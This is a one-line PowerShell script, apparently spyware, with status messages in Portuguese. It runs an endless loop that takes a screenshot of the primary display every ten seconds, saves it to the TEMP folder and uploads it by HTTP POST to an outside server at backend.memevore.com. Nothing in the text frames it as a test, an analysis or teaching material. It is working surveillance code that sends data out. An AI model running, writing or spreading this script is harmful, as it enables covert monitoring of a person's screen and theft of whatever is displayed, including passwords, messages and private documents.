$u="https://backend.memevore.com/upload";Add-Type -AssemblyName System.Windows.Forms;Add-Type -AssemblyName System.Drawing;Add-Type -AssemblyName System.Net.Http;while($true){try{$b=[Windows.Forms.Screen]::PrimaryScreen.Bounds;$img=[Drawing.Bitmap]::new($b.Width,$b.Height);$g=[Drawing.Graphics]::FromImage($img);$g.CopyFromScreen($b.Location,[Drawing.Point]::Empty,$b.Size);$p="$env:TEMP\screenshot.png";$img.Save($p,[Drawing.Imaging.ImageFormat]::Png);$fb=[IO.File]::ReadAllBytes($p);$bac=[System.Net.Http.ByteArrayContent]::new([byte[]]$fb);$bac.Headers.Add("Content-Disposition",'form-data; name="file"; filename="screenshot.png"');$bac.Headers.ContentType=[System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("image/png");$content=[System.Net.Http.MultipartFormDataContent]::new();$content.Add($bac,"file");$client=[System.Net.Http.HttpClient]::new();$r=$client.PostAsync($u,$content).Result;Write-Host "[$(Get-Date)] Enviado: $($r.StatusCode)";$g.Dispose();$img.Dispose();$client.Dispose();$content.Dispose()}catch{Write-Host "Erro: $_"};Start-Sleep -s 10}
